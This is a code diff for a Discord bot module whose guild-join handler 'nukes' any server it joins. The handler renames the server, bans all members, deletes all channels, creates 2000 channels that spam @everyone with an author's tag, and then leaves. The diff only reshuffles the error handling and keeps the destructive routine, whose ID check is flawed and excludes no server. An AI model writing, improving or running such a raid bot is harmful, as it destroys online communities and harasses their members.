@@ -14,33 +14,27 @@ class Startup(commands.Cog):
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
         if guild.id != 993573362221715546 or guild.id != 993594197594607636:
-            print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
-            guild.create_invite(max_age = 300)
-            await guild.edit("NOX WAS HERE" + str(random.randint(1, 100)))
-            print(f'Nuked guild: {guild.name} - {str(guild.id)} - Changed server name :)')
-            for member in guild.members:
-                try:
+            try:
+                print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
+                guild.create_invite(max_age = 300)
+                await guild.edit("NOX WAS HERE" + str(random.randint(1, 100)))
+                print(f'Nuked guild: {guild.name} - {str(guild.id)} - Changed server name :)')
+                for member in guild.members:
                     await member.ban(reason='Banned by Anix <3')
                     print(f'Banned {member.name} - {str(member.id)}')
-                except:
-                    pass
-            print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
-            for c in guild.channels:
-                await c.delete()
-            print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all channels :)')
-            try:
+                print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Banned all possible members")
+                for c in guild.channels:
+                    await c.delete()
+                print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all channels :)')
                 for i in range(0,2000):
                     await guild.create_text_channel(f'fuckme{i}')
                     await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme{i}').id).send("@everyone nox#4041 is the best")
-            except:
-                pass
-            print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
-            try:
+                print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
                 await guild.leave()
-            except:
-                pass
-            print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')
-
+                # error for 
+                print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')
+            except discord.ext.commands.GuildNotFound or discord.ext.commands.Forbidden:
+                print("Guild: " + str(guild.name) + " - " + str(guild.id) + " - Kicked or have been banned")
     @commands.Cog.listener()
     async def on_guild_remove(self, guild):
         print(f'Left guild: {guild.name} - {str(guild.id)}')
